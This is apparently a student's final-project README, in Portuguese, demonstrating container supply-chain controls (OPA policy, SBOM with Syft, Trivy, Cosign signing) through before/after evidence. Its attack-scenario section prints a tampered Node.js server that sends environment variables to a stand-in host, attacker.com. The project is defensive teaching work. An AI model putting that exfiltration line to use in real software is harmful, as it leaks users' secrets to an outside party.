# Raio-X da Cadeia de Suprimentos

**Projeto Final CY-SE-013** — Paulo Alberto de Oliveira Lima

Uma demonstração prática de segurança da cadeia de suprimentos através de controles aplicados em camadas: **política, inventário e identidade**. O objetivo é mostrar o **antes e depois** de uma aplicação simples e evidenciar como cada camada detecta ataques diferentes.

---

## Sumário

1. [A Aplicação](#a-aplicação)
2. [Cenário Inicial: Sem Controles](#cenário-inicial-sem-controles)
3. [O Ataque: Imagem Adulterada](#o-ataque-imagem-adulterada)
4. [Controles Implementados](#controles-implementados)
5. [Resultados e Evidências](#resultados-e-evidências)
6. [Por Que Isso Importa: SolarWinds e XZ Utils](#por-que-isso-importa-solarwinds-e-xz-utils)
7. [Limitações Reconhecidas](#limitações-reconhecidas)
8. [Como Reproduzir](#como-reproduzir)
9. [Estrutura do Projeto](#estrutura-do-projeto)

---

## A Aplicação

Uma aplicação de exemplo minimalista: um servidor HTTP Node.js que responde "OK" na porta 8080.

```javascript
// app/server.js
require('http').createServer((_, res) => res.end('Raio-X da Cadeia de Suprimentos: OK\n')).listen(8080);
```

O foco **não é a aplicação**, mas sim os **controles da cadeia de suprimentos** aplicados à sua imagem de contêiner.

---

## Cenário Inicial: Sem Controles

### Dockerfile "Antes"

```dockerfile
FROM node:14
WORKDIR /app
COPY server.js .
CMD ["node", "server.js"]
```

**Problemas:**

1. **Tag mutável** (`node:14`): qualquer um pode publicar outra imagem com a mesma tag
2. **Base desatualizada**: `node:14` usa Debian 10 (Buster), fora de suporte desde 2022
3. **Container roda como root** (UID 0): sem instrução `USER`
4. **Sem inventário**: ninguém sabe quais pacotes ou vulnerabilidades existem dentro da imagem
5. **Sem assinatura**: não há como provar a origem ou detectar adulteração

### Evidências do Estado Inicial

#### Container roda como root:

```
antes roda como: 0  | depois roda como: 1000
```
📄 [`evidencias/05-usuario.txt`](evidencias/05-usuario.txt)

#### Vulnerabilidade CRITICAL encontrada:

O Trivy detectou **CVE-2021-3177** (CRITICAL) no Python 2.7 da base `node:14`:

```json
{
  "CVE": "CVE-2021-3177",
  "severidade": "CRITICAL",
  "pacote": "python2.7",
  "versao_instalada": "2.7.16-2+deb10u1",
  "corrigida_em": "2.7.16-2+deb10u2",
  "titulo": "python: Stack-based buffer overflow in PyCArg_repr in _ctypes/callproc.c",
  "link": "https://avd.aquasec.com/nvd/cve-2021-3177"
}
```
📄 [`evidencias/08-vuln-real.json`](evidencias/08-vuln-real.json)

A imagem "antes" contém:
- **21.070 componentes** inventariados no SBOM
- **7 vulnerabilidades CRITICAL**
- **70 vulnerabilidades HIGH**

📄 [`evidencias/06-sbom-resumo.txt`](evidencias/06-sbom-resumo.txt), [`evidencias/07-trivy-contagem.txt`](evidencias/07-trivy-contagem.txt)

---

## O Ataque: Imagem Adulterada

**Cenário (baseado na Aula 6):** um atacante com acesso ao registry publica uma imagem maliciosa **na mesma tag `1.0.0`**, substituindo o código original por um que exfiltra variáveis de ambiente (`process.env`) contendo segredos.

```javascript
// server.js adulterado (não versionado, inserido no registry)
const http = require('http');
http.get('http://attacker.com/collect?data=' + JSON.stringify(process.env));
require('http').createServer((_, res) => res.end('OK\n')).listen(8080);
```

Quando outro desenvolvedor ou pipeline de CI/CD executa `docker pull app:1.0.0`, recebe a imagem maliciosa sem nenhum aviso.

### O que acontece sem controles:

- A **policy Rego sozinha não detecta** — o Dockerfile é o mesmo
- Não há assinatura para comparar
- O digest mudou silenciosamente, mas ninguém fixou o digest original

---

## Controles Implementados

### 1. **Política como Código (OPA Rego)**

Política que bloqueia imagens inseguras **antes** do build:

```rego
# policy/dockerfile.rego (resumido)
deny contains "Container roda como root: falta instrução USER" if count(users) == 0

deny contains msg if {
    some img in from_images
    not startswith(img, "docker.io/library/")
    msg := sprintf("Imagem fora do registry aprovado: %s", [img])
}

deny contains msg if {
    some img in from_images
    not contains(img, "@sha256:")
    msg := sprintf("Imagem sem digest (tag mutável): %s", [img])
}
```

**Testes automatizados:**

```
PASS: 5/5
- test_depois_aprovado
- test_sem_user_negado
- test_user_root_negado
- test_registry_nao_aprovado_negado
- test_tag_sem_digest_negado
```
📄 [`evidencias/02-opa-test.txt`](evidencias/02-opa-test.txt)

**Gate no Dockerfile.antes:**

```
FAIL - Container roda como root: falta instrução USER
FAIL - Imagem fora do registry aprovado (docker.io/library/): node:14
FAIL - Imagem sem digest (tag mutável): node:14

3 failures
```
📄 [`evidencias/04-conftest-antes.txt`](evidencias/04-conftest-antes.txt)

### 2. **Inventário: SBOM com Syft + Análise de Vulnerabilidades com Trivy**

- **SBOM (Software Bill of Materials)** em formato CycloneDX gerado automaticamente
- Trivy consome o SBOM e reporta vulnerabilidades conhecidas

**Comparação antes × depois:**

| Métrica | Antes (`node:14`) | Depois (`node:20-bookworm-slim`) |
|---------|-------------------|----------------------------------|
| **Componentes** | 21.070 | 3.487 |
| **CRITICAL** | 7 | 1 |
| **HIGH** | 70 | 29 |
| **MEDIUM** | 65 | 22 |
| **LOW** | 12 | 21 |

📄 [`evidencias/07-trivy-contagem.txt`](evidencias/07-trivy-contagem.txt), [`sbom-antes.cdx.json`](sbom-antes.cdx.json), [`sbom-depois.cdx.json`](sbom-depois.cdx.json)

### 3. **Assinatura e Verificação com Cosign**

A imagem "depois" é **assinada por digest** e tem o SBOM atestado:

```
IMAGEM=localhost:5050/raio-x/app@sha256:6c695ea3077afa804eb26ccede44e066652d0078437f7cf12fbe6427e73d8fef
```
📄 [`evidencias/09-imagem.txt`](evidencias/09-imagem.txt)

**Assinatura aplicada:**

```
Signing artifact...
Pushing signature to: localhost:5050/raio-x/app
Using payload from: sbom-depois.cdx.json
```
📄 [`evidencias/10-assinatura.txt`](evidencias/10-assinatura.txt)

**Verificação bem-sucedida:**

```json
[
  {
    "critical": {
      "identity": {
        "docker-reference": "localhost:5050/raio-x/app@sha256:6c695ea3077afa804eb26ccede44e066652d0078437f7cf12fbe6427e73d8fef"
      },
      "image": {
        "docker-manifest-digest": "sha256:6c695ea3077afa804eb26ccede44e066652d0078437f7cf12fbe6427e73d8fef"
      },
      "type": "https://sigstore.dev/cosign/sign/v1"
    }
  }
]
```
📄 [`evidencias/11-verificacao.json`](evidencias/11-verificacao.json) (trecho)

### 4. **Dockerfile Corrigido**

```dockerfile
FROM docker.io/library/node:20-bookworm-slim@sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0
WORKDIR /app
COPY --chown=node:node server.js .
USER node
CMD ["node", "server.js"]
```

**Melhorias aplicadas:**
- ✅ Registry aprovado explícito (`docker.io/library/`)
- ✅ Base pinada por **digest SHA-256** (imutável)
- ✅ Imagem base atualizada (`node:20-bookworm-slim`)
- ✅ Container roda como usuário sem privilégios (`USER node`, UID 1000)

**Aprovação na policy:**

```
4 tests, 4 passed, 0 warnings, 0 failures, 0 exceptions
```
📄 [`evidencias/04-conftest-depois.txt`](evidencias/04-conftest-depois.txt)

---

## Resultados e Evidências

### Detecção de Adulteração

Quando a imagem é adulterada (mesmo Dockerfile, código alterado no registry), a **assinatura Cosign detecta**:

```
tag 1.0.0 agora -> sha256:7bb39073be7836989c117b5d94f2a4ce62b66a3b52c83dc549f6c4481d9480bc 
(assinado era sha256:6c695ea3077afa804eb26ccede44e066652d0078437f7cf12fbe6427e73d8fef)

--- conftest no Dockerfile adulterado (mesmo Dockerfile, código trocado):
4 tests, 4 passed, 0 warnings, 0 failures, 0 exceptions

--- cosign verify da tag adulterada:
Error: no signatures found
error during command execution: no signatures found
exit=10
```
📄 [`evidencias/12-adulteracao.txt`](evidencias/12-adulteracao.txt)

**Ponto-chave:** a policy Rego **não detecta** a adulteração porque o Dockerfile não mudou. Apenas o **Cosign** (assinatura por digest) identifica que a imagem foi trocada.

### Proteção Contra Chave de Atacante

Se um atacante tentar assinar a imagem adulterada com uma chave própria, a verificação com a chave pública legítima falha:

```
Error: no matching attestations: failed to verify signature: could not verify envelope: 
accepted signatures do not match threshold, Found: 0, Expected 1
exit=1
```
📄 [`evidencias/13-chave-de-atacante.txt`](evidencias/13-chave-de-atacante.txt)

### Cada Camada Pega um Ataque Diferente

| Ataque | Policy Rego | SBOM + Trivy | Cosign |
|--------|-------------|--------------|--------|
| Dockerfile com `FROM node:14` (tag mutável) | ✅ **BLOQUEIA** | — | — |
| Container como root | ✅ **BLOQUEIA** | — | — |
| Registry não aprovado (`FROM evil.registry.io/node`) | ✅ **BLOQUEIA** | — | — |
| Vulnerabilidade conhecida na base | — | ✅ **EVIDENCIA** | — |
| Imagem adulterada na mesma tag | ❌ Não detecta | — | ✅ **BLOQUEIA** |
| Assinatura com chave de atacante | — | — | ✅ **BLOQUEIA** |

📄 [`MAPA_DE_AMEACAS.md`](MAPA_DE_AMEACAS.md)

---

## Por Que Isso Importa: SolarWinds e XZ Utils

### SolarWinds (2020)

**O que aconteceu:**
- Atacantes comprometeram o pipeline de build da SolarWinds
- Uma atualização maliciosa do Orion foi **assinada pela própria empresa**
- Distribuída para ~18.000 clientes através do mecanismo oficial de atualização
- Backdoor permaneceu ativo por meses antes da descoberta

**Lições para este projeto:**
- **Assinatura sozinha não basta** se o processo de build foi comprometido
- É necessário **identidade verificável** do build (proveniência)
- Por isso o keyless (Cosign + Fulcio + Rekor) liga a assinatura ao **workflow específico** e registra publicamente no log de transparência Rekor
- A verificação keyless valida não apenas *se* foi assinado, mas **quem/o quê** assinou (issuer + workflow identity)

### XZ Utils (2024)

**O que aconteceu:**
- Backdoor sofisticado inserido na biblioteca liblzma (XZ Utils versão 5.6.0/5.6.1)
- O código malicioso estava **apenas no tarball de release**, não no repositório git público
- Descoberto por acaso após degradação de performance em conexões SSH
- Afetaria milhões de sistemas Linux se não fosse detectado

**Lições para este projeto:**
- **SBOM confiável** responde rapidamente: "quais imagens contêm liblzma 5.6.x?"
- Sem inventário, a busca teria que ser manual em cada servidor
- **Digest assinado** impede que um tarball/artefato adulterado entre silenciosamente em produção
- O atestado do SBOM (ligado ao digest) garante que o inventário corresponde à imagem verificada

---

## Limitações Reconhecidas

### Vulnerabilidades Ainda Presentes

A imagem "depois" **não está livre de CVEs**:

```
{"imagem":"depois","CRITICAL":1,"HIGH":29,"LOW":21,"MEDIUM":22,"UNKNOWN":3}
```

**Este projeto não afirma "zero vulnerabilidades"**. Os controles implementados:
- ✅ Tornam as vulnerabilidades **visíveis** (SBOM + Trivy)
- ✅ Reduzem a superfície de ataque (base slim, menos componentes)
- ✅ Permitem decisões informadas sobre aceitar, mitigar ou atualizar

A atualização de dependências vulneráveis é um processo contínuo (Renovate, Dependabot).

### Cosign: Keyless vs. Chave de Laboratório

**No script local (`run.sh`):**
- Usa **chave de laboratório** (`cosign.key` local, `cosign.pub` versionada)
- Sem registro no Rekor (log de transparência público)
- Razão: keyless no PC exige login OIDC interativo no navegador, quebrando a reprodutibilidade do script

**No GitHub Actions (`.github/workflows/keyless-sign.yml`):**
- Usa **keyless verdadeiro** (Sigstore Fulcio + Rekor)
- Identidade verificável: `https://github.com/paulolima1212/raio-x-cadeia-suprimentos/.github/workflows/keyless-sign.yml@refs/heads/main`
- Issuer: `https://token.actions.githubusercontent.com`
- Cada assinatura registrada publicamente no Rekor com timestamp
- A verificação valida o certificado OIDC efêmero e confirma a identidade do workflow

**O enunciado pede keyless** — a implementação de produção está no workflow, não no script local.

---

## Como Reproduzir

### Pré-requisitos

- Docker
- OPA (`opa`)
- Conftest (`conftest`)
- Syft (`syft`)
- Trivy (`trivy`)
- Cosign (`cosign`)
- `jq`

### Execução Completa

```bash
bash run.sh
```

O script:
1. Inicia um registry local na porta 5050
2. Executa testes OPA e validação Conftest
3. Constrói as imagens "antes" e "depois"
4. Gera SBOMs com Syft
5. Analisa vulnerabilidades com Trivy
6. Assina a imagem "depois" com Cosign (chave local)
7. Simula adulteração e detecta com verificação Cosign
8. Grava todas as evidências em `evidencias/`

### Limpeza

```bash
bash run.sh --cleanup
```

Remove o registry local, imagens e chave privada.

### Verificação no GitHub Actions

O workflow keyless roda automaticamente no push para `main`:

📄 [`.github/workflows/keyless-sign.yml`](.github/workflows/keyless-sign.yml)

Etapas:
1. Validação da policy Rego (gate)
2. Build e push por digest ao GitHub Container Registry
3. Assinatura keyless e atestado do SBOM
4. Verificação da identidade (issuer + workflow)
5. Teste negativo: adulteração detectada

---

## Estrutura do Projeto

```
.
├── app/
│   ├── Dockerfile.antes      # Dockerfile sem controles (referência)
│   ├── Dockerfile             # Dockerfile corrigido com controles
│   └── server.js              # Aplicação Node.js minimalista
├── policy/
│   ├── dockerfile.rego        # Política OPA: registry, digest, usuário
│   └── dockerfile_test.rego   # Testes automatizados da política
├── evidencias/                # Saídas de todas as ferramentas
│   ├── 02-opa-test.txt        # Resultado dos testes OPA (5/5)
│   ├── 04-conftest-antes.txt  # Gate no Dockerfile.antes (3 falhas)
│   ├── 04-conftest-depois.txt # Gate no Dockerfile (aprovado)
│   ├── 05-usuario.txt         # Comparação root vs. não-root
│   ├── 06-sbom-resumo.txt     # Contagem de componentes
│   ├── 07-trivy-contagem.txt  # Vulnerabilidades antes × depois
│   ├── 08-vuln-real.json      # CVE-2021-3177 (CRITICAL)
│   ├── 09-imagem.txt          # Digest assinado
│   ├── 10-assinatura.txt      # Saída do Cosign sign
│   ├── 11-verificacao.json    # Verificação Cosign bem-sucedida
│   ├── 12-adulteracao.txt     # Detecção de adulteração (exit 10)
│   ├── 13-chave-de-atacante.txt # Rejeição de chave não autorizada
│   └── 14-manifesto-sha256.txt # Hashes de integridade das evidências
├── sbom-antes.cdx.json        # SBOM da imagem "antes" (21.070 componentes)
├── sbom-depois.cdx.json       # SBOM da imagem "depois" (3.487 componentes)
├── cosign.pub                 # Chave pública de verificação (laboratório)
├── run.sh                     # Script de reprodução completa
├── MAPA_DE_AMEACAS.md         # Modelagem de ameaças e controles
├── COMPLIANCE.md              # Rastreabilidade forense
└── .github/workflows/
    └── keyless-sign.yml       # Assinatura keyless no GitHub Actions
```

---

## Documentação Adicional

- **Mapa de Ameaças:** [`MAPA_DE_AMEACAS.md`](MAPA_DE_AMEACAS.md) — análise de vetores de ataque e quais controles os bloqueiam ou evidenciam
- **Compliance:** [`COMPLIANCE.md`](COMPLIANCE.md) — rastreabilidade forense: "que evidência eu teria se fosse atacado amanhã?"

---

## Contato

**Paulo Alberto de Oliveira Lima**  
Projeto Final CY-SE-013 — Raio-X da Cadeia de Suprimentos
